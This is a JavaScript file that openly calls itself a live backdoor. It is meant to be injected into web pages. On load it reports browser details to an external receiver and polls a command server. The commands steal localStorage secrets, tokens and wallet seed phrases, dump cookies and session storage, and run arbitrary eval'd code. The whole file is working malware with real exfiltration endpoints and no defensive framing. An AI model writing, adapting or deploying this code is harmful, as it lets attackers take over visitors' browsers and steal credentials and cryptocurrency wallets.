// ============================================================
//  LIVE BACKDOOR.JS
//  Receiver: https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil
//  Commands: https://verdant-frangipane-b8d9fd-production.up.railway.app/cmd
// ============================================================

(function() {
    'use strict';

    const RECEIVER = 'https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil';
    const CMD_URL = 'https://verdant-frangipane-b8d9fd-production.up.railway.app/cmd';

    function getSession() {
        if (!localStorage.getItem('_bckdr_sid')) {
            localStorage.setItem('_bckdr_sid', Date.now() + '-' + Math.random().toString(36).slice(2));
        }
        return localStorage.getItem('_bckdr_sid');
    }

    function sendData(data) {
        const payload = {
            session: getSession(),
            url: location.href,
            timestamp: Date.now(),
            userAgent: navigator.userAgent,
            data: data
        };
        try {
            const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
            navigator.sendBeacon(RECEIVER, encoded);
            fetch(RECEIVER, {
                method: 'POST',
                body: encoded,
                headers: { 'Content-Type': 'text/plain' },
                mode: 'no-cors'
            }).catch(() => {});
        } catch(e) {}
        console.log('📤 Data sent to receiver');
    }

    function executeCommand(cmd) {
        let result = '';
        if (cmd === 'help') result = 'Commands: help, ping, status, keys, dump, js:code';
        else if (cmd === 'ping') result = 'pong';
        else if (cmd === 'status') result = 'Session: ' + getSession();
        else if (cmd === 'keys') {
            const keys = [];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const val = localStorage.getItem(key);
                if (/(?:key|secret|token|bundle|private|seed|mnemonic|phrase|password|auth|jwt|wallet|address|sBundle|bundleKey)/i.test(key) || /(?:key|secret|token|bundle|private|seed|mnemonic|phrase|password|auth|jwt|wallet|address|sBundle|bundleKey)/i.test(val)) {
                    keys.push({ key, value: val });
                }
            }
            result = JSON.stringify(keys, null, 2);
        } else if (cmd === 'dump') {
            result = JSON.stringify({
                localStorage: localStorage,
                sessionStorage: sessionStorage,
                cookies: document.cookie
            }, null, 2);
        } else if (cmd.startsWith('js:')) {
            try {
                const evalResult = eval(cmd.slice(3));
                result = typeof evalResult === 'string' ? evalResult : JSON.stringify(evalResult, null, 2);
            } catch(e) {
                result = 'Error: ' + e.message;
            }
        } else {
            result = 'Unknown command. Type "help".';
        }
        return result;
    }

    function startHeartbeat() {
        sendData({ type: 'heartbeat', session: getSession() });
        setInterval(() => {
            sendData({ type: 'heartbeat', session: getSession() });
        }, 30000);
        setInterval(() => {
            fetch(CMD_URL + '?sid=' + getSession())
                .then(r => r.json())
                .then(commands => {
                    if (commands && commands.length > 0) {
                        commands.forEach(cmd => {
                            const result = executeCommand(cmd);
                            sendData({ type: 'command_result', command: cmd, result: result });
                        });
                    }
                })
                .catch(() => {});
        }, 30000);
    }

    function init() {
        console.log('🔥 LIVE BACKDOOR LOADED');
        console.log('📡 Receiver:', RECEIVER);
        console.log('🔑 Session:', getSession());
        sendData({ type: 'system_info', platform: navigator.platform, userAgent: navigator.userAgent, screen: window.screen.width + 'x' + window.screen.height });
        startHeartbeat();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
